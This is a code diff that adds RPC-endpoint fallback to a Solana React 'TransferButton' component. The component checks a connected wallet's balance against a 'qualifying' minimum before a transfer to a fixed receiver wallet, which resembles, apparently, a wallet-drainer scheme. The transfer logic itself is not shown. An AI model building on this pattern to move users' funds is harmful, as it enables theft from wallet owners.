@@ -2,7 +2,7 @@
 import { useWallet } from '@solana/wallet-adapter-react';
 import { useCallback, useState } from 'react';
 import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
-import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';
+import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_ENDPOINTS, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
   const { publicKey, sendTransaction } = useWallet();
@@ -13,8 +13,24 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
-      const connection = new Connection(RPC_URL, 'confirmed');
-      const balance = await connection.getBalance(publicKey);
+      // Try each RPC endpoint until one responds
+      let connection;
+      let balance;
+      let connected = false;
+      for (const rpc of RPC_ENDPOINTS) {
+        try {
+          connection = new Connection(rpc, 'confirmed');
+          balance = await connection.getBalance(publicKey);
+          connected = true;
+          break;
+        } catch (_) {
+          console.warn('RPC failed, trying next:', rpc);
+        }
+      }
+      if (!connected) {
+        alert('Network error: Could not connect to Solana. Please try again.');
+        return;
+      }
       const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
 
       if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
